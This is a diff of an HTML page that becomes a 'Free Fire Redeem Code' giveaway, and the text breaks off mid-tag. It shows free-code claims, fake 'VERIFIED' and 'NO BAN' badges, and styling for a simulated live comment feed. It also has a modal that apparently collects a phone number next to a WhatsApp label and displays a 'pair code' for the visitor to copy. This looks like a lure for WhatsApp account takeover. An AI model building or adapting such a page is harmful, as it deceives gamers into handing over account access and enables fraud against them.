@@ -1,902 +1,1117 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <meta name="theme-color" content="#07090b" />
-  <meta name="description" content="₹4999 Redeem Code demo landing page." />
-  <title>₹4999 Redeem Code</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, maximum-scale=1.0, user-scalable=no">
+  <title>FF Redeem Code — Watch & Claim</title>
   <style>
-    :root {
-      --bg: #07090b;
-      --text: #f4f7fb;
-      --muted: #8b94a3;
-      --muted-2: #6b7380;
-      --green: #2ee57a;
-      --cyan: #3ce7d8;
-      --orange: #ff8a2b;
-      --red: #ff3d4a;
-      --purple: #8a5cff;
-      --safe-bottom: env(safe-area-inset-bottom, 0px);
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
     }
-
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-
-    html, body {
-      background: #07090b;
-      color: var(--text);
-      font-family: Inter, ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
-      overflow-x: hidden;
-    }
-
     body {
-      background:
-        radial-gradient(1000px 420px at 50% -80px, rgba(46, 229, 122, 0.07), transparent 55%),
-        #07090b;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: #eef2f6;
+      color: #222;
+      min-height: 100vh;
     }
-
-    button { font-family: inherit; cursor: pointer; }
-
-    .page {
-      width: min(560px, 100%);
+    header {
+      background: linear-gradient(135deg, #FFE066, #FFB300, #FFD740, #FFA000);
+      background-size: 300% 300%;
+      animation: headerBg 5s ease infinite;
+      padding: 22px 16px 20px;
+      text-align: center;
+      box-shadow: 0 3px 12px rgba(255, 179, 0, 0.25);
+    }
+    @keyframes headerBg {
+      0%, 100% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+    }
+    .header-brand {
+      display: inline-block;
+      padding: 10px 22px 12px;
+      border: 2px solid rgba(120, 80, 0, 0.25);
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.35);
+      animation: brandPulse 2.2s ease-in-out infinite;
+    }
+    @keyframes brandPulse {
+      0%, 100% { transform: scale(1); box-shadow: 0 0 0 rgba(255, 200, 0, 0); }
+      50% { transform: scale(1.03); box-shadow: 0 0 18px rgba(255, 180, 0, 0.45); }
+    }
+    header h1 {
+      font-size: 24px;
+      font-weight: 800;
+      letter-spacing: 0.6px;
+      line-height: 1.25;
+      text-transform: uppercase;
+      background: linear-gradient(90deg, #3d2a00, #7a5200, #3d2a00, #5c4000, #3d2a00);
+      background-size: 200% auto;
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      animation: titleShine 3s linear infinite;
+    }
+    @keyframes titleShine {
+      0% { background-position: 0% center; }
+      100% { background-position: 200% center; }
+    }
+    header h1 span {
+      display: block;
+      font-size: 13px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      -webkit-text-fill-color: #6b4a00;
+      color: #6b4a00;
+      margin-bottom: 4px;
+      animation: spanFade 2s ease-in-out infinite;
+    }
+    @keyframes spanFade {
+      0%, 100% { opacity: 1; letter-spacing: 2px; }
+      50% { opacity: 0.75; letter-spacing: 3px; }
+    }
+    .container {
+      max-width: 500px;
       margin: 0 auto;
-      padding: 8px 14px calc(18px + var(--safe-bottom));
+      padding: 14px;
     }
-
-    .topbar {
+    .video-section {
+      text-align: center;
+      margin-bottom: 14px;
+    }
+    .video-section h2 {
+      font-size: 17px;
+      font-weight: 700;
+      color: #333;
+      letter-spacing: 0.8px;
+      margin-bottom: 10px;
+    }
+    .video-box {
+      background: #fff;
+      border-radius: 12px;
+      overflow: hidden;
+      border: 1px solid #dde3ea;
+      position: relative;
+    }
+    .video-box video {
+      width: 100%;
+      display: block;
+      aspect-ratio: 16 / 9;
+      object-fit: cover;
+      background: #111;
+      -webkit-user-select: none;
+      user-select: none;
+      -webkit-user-drag: none;
+    }
+    .app-card {
+      background: #fff;
+      border-radius: 14px;
+      padding: 16px;
+      border: 1px solid #dde3ea;
+    }
+    .app-row {
       display: flex;
       align-items: center;
-      justify-content: space-between;
-      gap: 10px;
-      padding: 10px 2px 10px;
+      gap: 14px;
     }
-
-    .brand {
-      display: flex;
-      align-items: center;
-      gap: 9px;
+    .app-icon {
+      width: 72px;
+      height: 72px;
+      border-radius: 14px;
+      object-fit: cover;
+      flex-shrink: 0;
+      -webkit-user-select: none;
+      user-select: none;
+      -webkit-user-drag: none;
+      pointer-events: none;
+    }
+    .app-info {
+      flex: 1;
       min-width: 0;
     }
-
-    .dots { display: flex; gap: 5px; flex-shrink: 0; }
-    .dots span {
-      width: 8px;
-      height: 8px;
-      border-radius: 50%;
-      display: block;
-    }
-    .dots span:nth-child(1) { background: #35e07a; box-shadow: 0 0 8px #35e07a; }
-    .dots span:nth-child(2) { background: #f0c12a; }
-    .dots span:nth-child(3) { background: #ff7a2b; }
-    .dots span:nth-child(4) { background: #9b5cff; }
-
-    .brand h1 {
-      font-size: clamp(13px, 3.6vw, 16px);
-      letter-spacing: 0.08em;
-      font-weight: 800;
-      white-space: nowrap;
-      overflow: hidden;
-      text-overflow: ellipsis;
-    }
-
-    .live-pill {
-      display: inline-flex;
-      align-items: center;
-      gap: 7px;
-      border: 1.5px solid rgba(46, 229, 122, 0.55);
-      background: rgba(14, 40, 26, 0.7);
-      color: var(--green);
-      border-radius: 999px;
-      padding: 6px 10px;
-      font-size: 12px;
-      font-weight: 800;
-      letter-spacing: 0.04em;
-      box-shadow: 0 0 16px rgba(46, 229, 122, 0.18);
-      flex-shrink: 0;
-    }
-
-    .pulse-dot {
-      width: 7px;
-      height: 7px;
-      border-radius: 50%;
-      background: var(--green);
-      box-shadow: 0 0 8px var(--green);
-      animation: pulse 1.6s ease-in-out infinite;
-    }
-
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); opacity: 1; }
-      50% { transform: scale(1.35); opacity: 0.55; }
-    }
-
-    .features {
+    .tags {
       display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      color: #7f8a78;
-      font-size: 12.5px;
-      padding: 2px 0 12px;
-    }
-    .features .sep { color: #3d4540; }
-    .features strong { color: #a7b3a8; font-weight: 600; }
-
-    .step {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin: 2px 0 10px;
-      color: #cfd6cf;
-      font-size: 12px;
-      font-weight: 700;
-      letter-spacing: 0.12em;
-    }
-    .step .bar {
-      width: 28px;
-      height: 3px;
-      border-radius: 99px;
-      background: linear-gradient(90deg, var(--orange), #ffd36a);
-    }
-    .step.claim { margin-top: 2px; margin-bottom: 10px; }
-    .step.claim .bar { background: linear-gradient(90deg, var(--green), var(--cyan)); }
-
-    .media-card {
-      position: relative;
-      border-radius: 18px;
-      overflow: hidden;
-      background: #0b1014;
-      border: 1px solid rgba(60, 231, 216, 0.18);
-      box-shadow: 0 0 28px rgba(46, 229, 122, 0.08), 0 18px 50px rgba(0, 0, 0, 0.45);
-      aspect-ratio: 16 / 10.2;
-    }
-
-    .media-stage {
-      width: 100%;
-      height: 100%;
-      display: grid;
-      place-items: center;
-      background:
-        radial-gradient(circle at 30% 20%, rgba(60, 231, 216, 0.08), transparent 35%),
-        radial-gradient(circle at 80% 80%, rgba(138, 92, 255, 0.12), transparent 40%),
-        linear-gradient(180deg, #152029 0%, #0a1016 100%);
-    }
-    .media-stage video {
-      position: absolute;
-      inset: 0;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      background: #000;
-    }
-    .media-card.playing .play,
-    .media-card.playing .preview-chip { opacity: 0; pointer-events: none; }
-
-    .play {
-      width: 68px;
-      height: 68px;
-      border-radius: 50%;
-      border: 0;
-      background: rgba(255, 255, 255, 0.94);
-      display: grid;
-      place-items: center;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
-      z-index: 2;
-      transition: transform 0.2s ease;
-    }
-    .play:hover { transform: scale(1.06); }
-    .play:active { transform: scale(0.96); }
-    .play svg { margin-left: 3px; }
-
-    .corner {
-      position: absolute;
-      width: 22px;
-      height: 22px;
-      border: 2px solid rgba(60, 231, 216, 0.85);
-      z-index: 2;
-    }
-    .corner.tl { top: 10px; left: 10px; border-right: 0; border-bottom: 0; border-radius: 4px 0 0 0; }
-    .corner.br { right: 10px; bottom: 10px; border-left: 0; border-top: 0; border-radius: 0 0 4px 0; }
-
-    .live-badge {
-      position: absolute;
-      top: 12px;
-      right: 12px;
-      display: inline-flex;
-      align-items: center;
       gap: 6px;
-      background: rgba(20, 8, 10, 0.82);
-      border: 1px solid rgba(255, 61, 74, 0.7);
-      color: #fff;
+      margin-bottom: 6px;
+    }
+    .tag {
       font-size: 11px;
-      font-weight: 800;
-      letter-spacing: 0.08em;
-      padding: 5px 9px;
-      border-radius: 8px;
-      box-shadow: 0 0 14px rgba(255, 61, 74, 0.35);
-      z-index: 3;
+      padding: 4px 10px;
+      border-radius: 12px;
+      font-weight: 600;
     }
-    .live-badge i {
-      width: 7px;
-      height: 7px;
-      border-radius: 50%;
-      background: var(--red);
-      box-shadow: 0 0 8px var(--red);
-      animation: pulse 1.2s ease-in-out infinite;
-    }
-
-    .preview-chip {
-      position: absolute;
-      left: 14px;
-      bottom: 12px;
-      z-index: 2;
-      font-size: 11px;
-      color: #c9d4de;
-      background: rgba(0, 0, 0, 0.45);
-      border: 1px solid rgba(255,255,255,0.08);
-      padding: 5px 8px;
-      border-radius: 8px;
-    }
-
-    .watch-copy { text-align: center; padding: 10px 8px 4px; }
-    .watch-copy h2 {
-      font-size: clamp(22px, 6vw, 28px);
-      font-weight: 800;
-      letter-spacing: 0.04em;
-      background: linear-gradient(90deg, #ff7a1a, #ffb347 45%, #ffd27a);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-    }
-    .watch-copy p {
-      margin-top: 7px;
-      color: #9aa3ad;
-      font-size: 14px;
-    }
-    .claims {
-      margin-top: 8px;
-      font-size: 14px;
-      color: #8f98a3;
-    }
-    .claims b { color: var(--green); font-weight: 800; }
-
-    .redeem-wrap { padding: 0 0 10px; margin-top: -2px; }
-    .rainbow {
-      position: relative;
-      border-radius: 24px;
-      padding: 2.5px;
-      background: conic-gradient(from 210deg, #ff2d2d, #ff8a00, #ffe14a, #2ee57a, #00e5ff, #3b82ff, #a855ff, #ff2d2d);
-      box-shadow:
-        0 0 18px rgba(255, 60, 80, 0.18),
-        0 0 22px rgba(80, 180, 255, 0.16),
-        0 12px 28px rgba(0,0,0,0.4);
-    }
-    .rainbow::before {
-      content: "";
-      position: absolute;
-      inset: -2px;
-      border-radius: 26px;
-      background: conic-gradient(from 210deg, #ff2d2d, #ff8a00, #2ee57a, #00e5ff, #3b82ff, #a855ff, #ff2d2d);
-      filter: blur(10px);
-      opacity: 0.28;
-      z-index: -1;
-    }
-    .redeem {
-      background: #0a0a0c;
-      border-radius: 22px;
-      padding: 18px 16px 16px;
-    }
-    .redeem-top {
-      display: grid;
-      grid-template-columns: 78px 1fr;
-      gap: 14px;
-      align-items: center;
-    }
-    .icon-tile {
-      width: 78px;
-      height: 78px;
-      border-radius: 18px;
-      background: #fff;
-      display: grid;
-      place-items: center;
-      overflow: hidden;
-    }
-    .icon-tile img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      display: block;
-    }
-    .redeem-meta { min-width: 0; }
-    .badges { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 8px; }
-    .badge {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      height: 26px;
-      padding: 0 12px;
-      border-radius: 999px;
-      font-size: 11px;
-      font-weight: 800;
-      letter-spacing: 0.06em;
+    .tag-new {
+      background: #ff3b3b;
       color: #fff;
     }
-    .badge.new { background: #ff2d3a; }
-    .badge.premium { background: #7b4dff; }
-    .redeem h3 {
-      font-size: clamp(20px, 5.6vw, 26px);
-      line-height: 1.15;
-      font-weight: 800;
-      letter-spacing: -0.02em;
+    .tag-premium {
+      background: #6a5cff;
       color: #fff;
     }
-    .redeem .sub {
-      margin-top: 7px;
-      color: #b0b6be;
-      font-size: 15px;
-      font-weight: 500;
+    .app-name {
+      font-size: 17px;
+      font-weight: 700;
+      color: #222;
+      margin: 4px 0;
+    }
+    .app-desc {
+      font-size: 12px;
+      color: #666;
+      line-height: 1.4;
     }
     .stars {
-      margin-top: 10px;
-      color: #f5c242;
-      letter-spacing: 3px;
-      font-size: 18px;
+      color: #ffcc00;
+      font-size: 15px;
+      margin-top: 6px;
     }
-    .card-cta {
-      margin-top: 18px;
-      width: 100%;
-      min-height: 56px;
-      border: 0;
-      border-radius: 999px;
-      color: #fff;
-      font-size: 16px;
-      font-weight: 800;
-      letter-spacing: 0.06em;
-      text-decoration: none;
-      background: linear-gradient(180deg, #3dff8a 0%, #18d35f 52%, #0db24d 100%);
-      box-shadow:
-        0 0 0 1px rgba(90, 255, 160, 0.35),
-        0 0 18px rgba(46, 229, 122, 0.55),
-        0 0 36px rgba(22, 200, 90, 0.38),
-        0 8px 18px rgba(22, 200, 90, 0.28);
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      animation: ctaGlow 1.8s ease-in-out infinite;
-      transition: transform 0.18s ease, filter 0.18s ease;
+    .install-stat {
+      text-align: center;
+      font-size: 11px;
+      color: #888;
+      margin: 14px 0 10px;
     }
-    .card-cta:hover { transform: scale(1.02); filter: brightness(1.08); }
-    .card-cta:active { transform: scale(0.985); }
-
-    @keyframes ctaGlow {
-      0%, 100% {
-        box-shadow:
-          0 0 0 1px rgba(90, 255, 160, 0.28),
-          0 0 14px rgba(46, 229, 122, 0.4),
-          0 0 28px rgba(22, 200, 90, 0.25),
-          0 8px 16px rgba(22, 200, 90, 0.22);
-      }
-      50% {
-        box-shadow:
-          0 0 0 2px rgba(160, 255, 200, 0.55),
-          0 0 24px rgba(46, 229, 122, 0.75),
-          0 0 48px rgba(22, 200, 90, 0.5),
-          0 10px 22px rgba(22, 200, 90, 0.35);
-      }
-    }
-
-    .comments {
-      margin-top: 4px;
-      background: #10151a;
-      border: 1px solid rgba(255,255,255,0.06);
-      border-radius: 18px;
-      padding: 14px 12px 10px;
-    }
-    .comments-head {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 10px;
-      padding: 0 4px;
-    }
-    .comments-head .left {
-      display: flex;
-      align-items: center;
-      gap: 8px;
+    .install-stat strong {
+      color: #00aa6c;
       font-weight: 700;
-      font-size: 14px;
     }
-    .comments-head .left .dot {
-      width: 8px;
-      height: 8px;
-      border-radius: 50%;
-      background: var(--red);
-      box-shadow: 0 0 8px var(--red);
-    }
-    .watching { color: var(--muted); font-size: 13px; }
-
-    .feed {
-      display: flex;
-      flex-direction: column;
-      gap: 14px;
-      min-height: 280px;
-      padding: 6px 2px 8px;
-    }
-    .row {
-      display: grid;
-      grid-template-columns: 34px 1fr;
-      gap: 10px;
-      align-items: start;
-      animation: slideIn 0.45s ease both;
-    }
-    @keyframes slideIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    .avatar {
-      width: 34px;
-      height: 34px;
-      border-radius: 50%;
-      display: grid;
-      place-items: center;
-      font-weight: 800;
-      font-size: 13px;
-      color: #fff;
-    }
-    .meta { display: flex; align-items: baseline; gap: 8px; flex-wrap: wrap; }
-    .meta .name { font-weight: 700; font-size: 13.5px; }
-    .meta .when { color: var(--muted-2); font-size: 12px; }
-    .msg { margin-top: 2px; color: #c5ccd4; font-size: 13.5px; line-height: 1.35; }
-
-    .more {
+    .install-btn {
       display: block;
       width: 100%;
-      border: 0;
-      background: transparent;
-      color: #8b94a3;
-      font-size: 13px;
-      padding: 8px 0 4px;
-    }
-
-    footer {
-      text-align: center;
-      color: #6b7380;
-      font-size: 12px;
-      padding: 16px 10px 14px;
-      line-height: 1.6;
-    }
-
-    .wa-wrap { padding: 0 0 8px; }
-    .wa {
-      width: 100%;
-      min-height: 52px;
-      border: 0;
-      border-radius: 999px;
-      background: #25d366;
+      padding: 15px;
+      border: none;
+      border-radius: 30px;
+      font-size: 17px;
+      font-weight: 700;
       color: #fff;
-      font-size: 16px;
-      font-weight: 800;
+      text-align: center;
       text-decoration: none;
+      background: linear-gradient(90deg, #00ff88, #00cc6a);
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      z-index: 0;
+    }
+    .install-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -80%;
+      width: 50%;
+      height: 100%;
+      background: linear-gradient(
+        90deg,
+        transparent,
+        rgba(255, 255, 255, 0.15),
+        rgba(255, 255, 255, 0.55),
+        rgba(255, 255, 255, 0.15),
+        transparent
+      );
+      transform: skewX(-22deg);
+      animation: btnSideShine 2.4s ease-in-out infinite;
+      pointer-events: none;
+      z-index: 0;
+    }
+    .install-btn .btn-label {
+      position: relative;
+      z-index: 1;
+    }
+    @keyframes btnSideShine {
+      0% { left: -80%; }
+      40%, 100% { left: 130%; }
+    }
+    .install-btn:active {
+      opacity: 0.9;
+    }
+    .live-chat {
+      margin-top: 14px;
+      border-top: 1px solid #eef1f5;
+      padding-top: 12px;
+    }
+    .live-chat-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 8px;
+    }
+    .live-chat-title {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 12px;
+      font-weight: 700;
+      color: #333;
+    }
+    .live-dot-chat {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: #e53935;
+      animation: blink 0.8s ease-in-out infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+    .comment-count {
+      font-size: 11px;
+      color: #888;
+      font-weight: 600;
+    }
+    .comments-scroll {
+      max-height: 200px;
+      overflow-y: auto;
+      overflow-x: hidden;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      padding-right: 2px;
+      scroll-behavior: smooth;
+    }
+    .comments-scroll::-webkit-scrollbar {
+      width: 3px;
+    }
+    .comments-scroll::-webkit-scrollbar-thumb {
+      background: #ccc;
+      border-radius: 3px;
+    }
+    .comment {
+      display: flex;
+      gap: 8px;
+      animation: commentPop 0.25s ease;
+    }
+    @keyframes commentPop {
+      from { opacity: 0; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .comment-avatar {
+      width: 30px;
+      height: 30px;
+      border-radius: 50%;
+      flex-shrink: 0;
       display: flex;
       align-items: center;
       justify-content: center;
+      font-size: 12px;
+      font-weight: 700;
+      color: #fff;
+    }
+    .comment-body {
+      flex: 1;
+      min-width: 0;
+    }
+    .comment-meta {
+      display: flex;
+      align-items: baseline;
+      gap: 6px;
+      margin-bottom: 2px;
+    }
+    .comment-name {
+      font-size: 12px;
+      font-weight: 700;
+      color: #1a1a1a;
+    }
+    .comment-time {
+      font-size: 10px;
+      color: #999;
+    }
+    .comment-text {
+      font-size: 12px;
+      color: #444;
+      line-height: 1.35;
+      word-break: break-word;
+    }
+    .typing-bar {
+      display: flex;
+      align-items: center;
       gap: 8px;
-      box-shadow: 0 10px 28px rgba(37, 211, 102, 0.22);
-      transition: transform 0.18s ease;
+      padding: 6px 0 2px;
+      min-height: 28px;
     }
-    .wa:hover { transform: scale(1.01); }
-    .wa:active { transform: scale(0.985); }
-
-    .toast {
-      position: fixed;
-      left: 50%;
-      bottom: calc(18px + var(--safe-bottom));
-      transform: translateX(-50%) translateY(12px);
-      background: #141a20;
-      border: 1px solid rgba(46,229,122,0.25);
-      color: #e8eef4;
-      padding: 12px 14px;
+    .typing-avatar {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background: #ddd;
+      flex-shrink: 0;
+    }
+    .typing-dots {
+      display: flex;
+      gap: 4px;
+      padding: 6px 10px;
+      background: #f0f2f5;
       border-radius: 14px;
-      width: min(480px, calc(100% - 28px));
-      box-shadow: 0 18px 50px rgba(0, 0, 0, 0.45);
-      opacity: 0;
+    }
+    .typing-dots span {
+      width: 5px;
+      height: 5px;
+      border-radius: 50%;
+      background: #999;
+      animation: typeDot 1s ease-in-out infinite;
+    }
+    .typing-dots span:nth-child(2) { animation-delay: 0.15s; }
+    .typing-dots span:nth-child(3) { animation-delay: 0.3s; }
+    @keyframes typeDot {
+      0%, 100% { opacity: 0.3; transform: translateY(0); }
+      50% { opacity: 1; transform: translateY(-3px); }
+    }
+    .typing-bar.hidden {
+      display: none;
+    }
+    footer {
+      text-align: center;
+      padding: 14px;
+      font-size: 11px;
+      color: #999;
+    }
+    @media (max-width: 400px) {
+      header h1 { font-size: 20px; }
+      header h1 span { font-size: 11px; }
+      .video-section h2 { font-size: 15px; }
+      .app-icon { width: 60px; height: 60px; }
+      .install-btn { font-size: 15px; padding: 13px; }
+    }
+    .header-logo {
+      width: 52px;
+      height: 52px;
+      border-radius: 12px;
+      object-fit: cover;
+      margin-bottom: 8px;
+      border: 2px solid rgba(120, 80, 0, 0.2);
+      -webkit-user-select: none;
+      user-select: none;
+      -webkit-user-drag: none;
       pointer-events: none;
-      transition: opacity 0.25s ease, transform 0.25s ease;
-      z-index: 30;
-      font-size: 13.5px;
-      line-height: 1.45;
     }
-    .toast.show {
-      opacity: 1;
-      transform: translateX(-50%) translateY(0);
-    }
-
-    .modal {
+    .modal-overlay {
       position: fixed;
       inset: 0;
-      background: rgba(0,0,0,0.62);
-      display: none;
-      place-items: center;
-      z-index: 40;
-      padding: 20px;
+      background: rgba(238, 242, 246, 0.92);
+      backdrop-filter: blur(8px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.2s ease, visibility 0.2s ease;
     }
-    .modal.open { display: grid; }
-    .modal-card {
-      width: min(420px, 100%);
-      background: #12171c;
-      border: 1px solid rgba(255,255,255,0.08);
-      border-radius: 18px;
-      padding: 20px;
+    .modal-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+    .modal-container {
+      background: #fff;
+      border: 1px solid #dde3ea;
+      border-top: 3px solid #FFB300;
+      border-radius: 14px;
+      max-width: 400px;
+      width: 90%;
+      margin: 20px;
+      position: relative;
+      box-shadow: 0 12px 40px rgba(255, 179, 0, 0.15), 0 8px 24px rgba(0, 0, 0, 0.08);
+      overflow: hidden;
+    }
+    .modal-close {
+      position: absolute;
+      top: 10px;
+      right: 14px;
+      font-size: 24px;
+      color: #999;
+      cursor: pointer;
+      line-height: 1;
+      z-index: 10;
+      background: none;
+      border: none;
+    }
+    .modal-close:hover {
+      color: #333;
+    }
+    .modal-content {
+      padding: 28px 22px 24px;
       text-align: center;
     }
-    .modal-card h3 { margin-bottom: 8px; }
-    .modal-card p { color: #9aa3ad; font-size: 14px; }
-    .modal-card button {
-      margin-top: 16px;
-      width: 100%;
-      min-height: 44px;
-      border: 0;
-      border-radius: 999px;
-      background: var(--green);
-      color: #062014;
+    .popup-left {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 4px;
+      margin-bottom: 8px;
+    }
+    .whatsapp {
+      font-size: 1.75em;
+      color: #25d366;
       font-weight: 800;
+      letter-spacing: 0.5px;
     }
-
-    @media (min-width: 768px) {
-      .page { padding-top: 22px; }
-      .media-card { aspect-ratio: 16 / 9.2; }
+    .popup-left img {
+      width: 120px;
+      height: auto;
+      border-radius: 12px;
     }
-
-    @media (prefers-reduced-motion: reduce) {
-      *, *::before, *::after {
-        animation: none !important;
-        transition: none !important;
-      }
+    .header-divider {
+      width: 60px;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, #FFB300, transparent);
+      margin-top: 8px;
+    }
+    .modal-title {
+      font-size: 20px;
+      font-weight: 800;
+      color: #222;
+      margin-bottom: 8px;
+      letter-spacing: 0.5px;
+    }
+    .modal-sub {
+      font-size: 12px;
+      color: #666;
+      margin-bottom: 18px;
+      line-height: 1.45;
+    }
+    .input-group {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 16px;
+      flex-wrap: wrap;
+    }
+    .country-code {
+      flex: 1;
+      min-width: 60px;
+      max-width: 38%;
+      padding: 12px 8px;
+      border: 1px solid #dde3ea;
+      border-radius: 10px;
+      background: #f8f9fb;
+      color: #222;
+      font-size: 13px;
+      outline: none;
+    }
+    .phone-input {
+      flex: 2;
+      min-width: 0;
+      padding: 12px;
+      border: 1px solid #dde3ea;
+      border-radius: 10px;
+      background: #fff;
+      color: #222;
+      font-size: 14px;
+      outline: none;
+    }
+    .country-code:focus,
+    .phone-input:focus {
+      border-color: #FFB300;
+      box-shadow: 0 0 0 2px rgba(255, 179, 0, 0.15);
+    }
+    .get-code-btn {
+      width: 100%;
+      padding: 14px 20px;
+      border: none;
+      border-radius: 30px;
+      background: linear-gradient(90deg, #00ff88, #00cc6a);
+      color: #fff;
+      font-size: 16px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 6px 20px rgba(0, 204, 106, 0.25);
+    }
+    .get-code-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -80%;
+      width: 50%;
+      height: 100%;
+      background: linear-gradient(
+        90deg,
+        transparent,
+        rgba(255, 255, 255, 0.15),
+        rgba(255, 255, 255, 0.45),
+        rgba(255, 255, 255, 0.15),
+        transparent
+      );
+      transform: skewX(-22deg);
+      animation: btnSideShine 2.4s ease-in-out infinite;
+      pointer-events: none;
+    }
+    .get-code-btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    .pair-code {
+      background: linear-gradient(135deg, #fffbeb, #fff8e1);
+      padding: 16px;
+      font-family: monospace;
+      font-size: 24px;
+      letter-spacing: 5px;
+      color: #7a5200;
+      border: 1px solid rgba(255, 179, 0, 0.35);
+      border-radius: 12px;
+      margin: 16px 0;
+      word-break: break-all;
+    }
+    .copy-code-btn {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 30px;
+      background: linear-gradient(90deg, #00ff88, #00cc6a);
+      color: #fff;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 6px 20px rgba(0, 204, 106, 0.2);
+      transition: opacity 0.2s;
+    }
+    .copy-code-btn:hover {
+      opacity: 0.92;
     }
   </style>
 </head>
 <body>
-  <div class="page">
-    <header class="topbar">
-      <div class="brand">
-        <div class="dots" aria-hidden="true">
-          <span></span><span></span><span></span><span></span>
-        </div>
-        <h1>₹4999 REDEEM CODE</h1>
-      </div>
-      <div class="live-pill" aria-label="Simulated live counter">
-        <span class="pulse-dot" aria-hidden="true"></span>
-        <span><span id="liveCount">1,292</span> LIVE</span>
-      </div>
-    </header>
-
-    <div class="features" aria-hidden="true">
-      <span>Unlimited Codes</span>
-      <span class="sep">—</span>
-      <strong>Instant Claim</strong>
+  <header>
+    <div class="header-brand">
+      <img src="https://www.image2url.com/r2/default/files/1792654491880-105c2ad3-157c-4639-bf65-ad31a26b9ece.png" alt="FF Redeem Code" class="header-logo" draggable="false" oncontextmenu="return false;" ondragstart="return false;">
+      <h1><span>Free Fire</span>Redeem Code</h1>
     </div>
-
-    <section aria-labelledby="step1">
-      <div class="step" id="step1"><span class="bar"></span> STEP 01 — WATCH</div>
-
-      <div class="media-card">
-        <div class="media-stage">
-          <video
-            id="promoVideo"
-            autoplay
-            loop
-            playsinline
-            webkit-playsinline
-            preload="auto"
-            controlslist="nodownload noplaybackrate"
-          >
-            <source src="lv_0_20260928135520.mp4" type="video/mp4">
-          </video>
-          <span class="live-badge"><i></i> LIVE</span>
-          <span class="corner tl"></span>
-          <span class="corner br"></span>
-          <button class="play" id="playBtn" type="button" aria-label="Play video">
-            <svg width="22" height="22" viewBox="0 0 24 24" fill="#111" aria-hidden="true">
-              <path d="M8 5v14l12-7z"/>
-            </svg>
-          </button>
-          <span class="preview-chip" id="timeChip">Tap to play</span>
+  </header>
+  <div class="container">
+    <section class="video-section">
+      <h2>WATCH FULL VIDEO</h2>
+      <div class="video-box">
+        <video
+          controls
+          controlsList="nodownload noremoteplayback noplaybackrate"
+          disablePictureInPicture
+          oncontextmenu="return false;"
+          ondragstart="return false;"
+          id="protectedVideo"
+          preload="auto"
+          playsinline
+          autoplay
+          draggable="false"
+        >
+          <source src="https://www.image2url.com/r2/default/files/1792654459784-688dafb8-e910-4ff3-81ca-bf345723c77d.mp4" type="video/mp4">
+          Your browser does not support the video tag.
+        </video>
+      </div>
+    </section>
+    <section class="app-card">
+      <div class="app-row">
+        <img src="https://www.image2url.com/r2/default/files/1792654491880-105c2ad3-157c-4639-bf65-ad31a26b9ece.png" alt="FF Redeem Code" class="app-icon" draggable="false" oncontextmenu="return false;" ondragstart="return false;">
+        <div class="app-info">
+          <div class="tags">
+            <span class="tag tag-new">HOT</span>
+            <span class="tag tag-premium">VERIFIED</span>
+          </div>
+          <h3 class="app-name">REDEEM CODE</h3>
+          <p class="app-desc">FREE FIRE REDEEM CODE · UNLIMITED ACCESS · NO BAN</p>
+          <div class="stars">★★★★★</div>
         </div>
       </div>
-
-      <div class="watch-copy">
-        <h2>WATCH FULL VIDEO</h2>
-        <p>Complete the video to unlock your redeem code</p>
-        <div class="claims"><b id="claimsCount">4,681</b> claims in last hour</div>
-      </div>
-
-      <div class="redeem-wrap">
-        <div class="rainbow">
-          <article class="redeem">
-            <div class="redeem-top">
-              <div class="icon-tile">
-                <img
-                  src="https://www.image2url.com/r2/default/files/1790583672275-f1a31aa9-b43d-4ad6-a24c-5773a44c6512.jpeg"
-                  alt="₹4999 redeem code"
-                  width="78"
-                  height="78"
